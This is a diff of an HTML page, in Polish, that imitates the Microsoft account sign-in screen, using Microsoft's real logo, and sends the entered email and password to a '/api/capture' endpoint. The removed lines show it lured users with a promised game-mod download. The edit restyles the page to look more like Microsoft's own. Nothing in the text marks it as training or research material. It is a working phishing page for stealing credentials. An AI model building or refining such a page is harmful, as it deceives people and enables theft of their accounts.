@@ -3,37 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zaloguj się do konta Microsoft</title>
+    <title>Zaloguj się do swojego konta Microsoft</title>
     <style>
-        body { background-color: #f2f2f2; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; padding: 44px; width: 360px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        .logo { width: 108px; margin-bottom: 20px; }
-        h2 { font-size: 24px; font-weight: 600; color: #1b1b1b; margin: 0 0 12px 0; }
-        p { font-size: 15px; margin-bottom: 20px; color: #1b1b1b; }
-        input { width: 100%; padding: 8px 10px; margin-bottom: 15px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #ebedef; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #fff; padding: 44px; width: 360px; min-height: 340px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .logo { width: 108px; height: 24px; margin-bottom: 24px; }
+        .title { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #1b1b1b; }
+        .input-group { margin-top: 10px; }
+        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 16px; margin-bottom: 16px; outline: none; }
         input:focus { border-bottom-color: #0067b8; }
-        .links { font-size: 13px; color: #0067b8; margin-bottom: 30px; }
-        .links a { text-decoration: none; color: #0067b8; }
-        .btn-container { display: flex; justify-content: flex-end; }
-        button { background-color: #0067b8; color: white; border: none; padding: 8px 30px; font-size: 15px; cursor: pointer; min-width: 108px; }
-        button:hover { background-color: #005da6; }
+        .link { color: #0067b8; font-size: 13px; text-decoration: none; display: block; margin-bottom: 20px; }
+        .btn-row { display: flex; justify-content: flex-end; margin-top: 20px; }
+        button { background: #0067b8; color: #fff; border: none; padding: 8px 30px; font-size: 15px; cursor: pointer; min-width: 100px; }
+        button:hover { background: #005da6; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
-        <h2>Zaloguj się</h2>
-        <p>Zaloguj się, aby uzyskać dostęp do pobierania moda.</p>
-        
+    <div class="box">
+        <img class="logo" src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg">
+        <div class="title">Zaloguj się</div>
         <form action="/api/capture" method="POST">
-            <input type="email" name="email" placeholder="Adres e-mail, telefon lub Skype" required>
-            <input type="password" name="password" placeholder="Hasło" required>
-            
-            <div class="links">
-                <a href="#">Nie możesz uzyskać dostępu do konta?</a>
+            <div class="input-group">
+                <input type="email" name="email" placeholder="Adres e-mail, telefon lub Skype" required>
+                <input type="password" name="password" placeholder="Hasło" required>
             </div>
-            
-            <div class="btn-container">
+            <a href="#" class="link">Nie możesz uzyskać dostępu do konta?</a>
+            <div class="btn-row">
                 <button type="submit">Dalej</button>
             </div>
         </form>
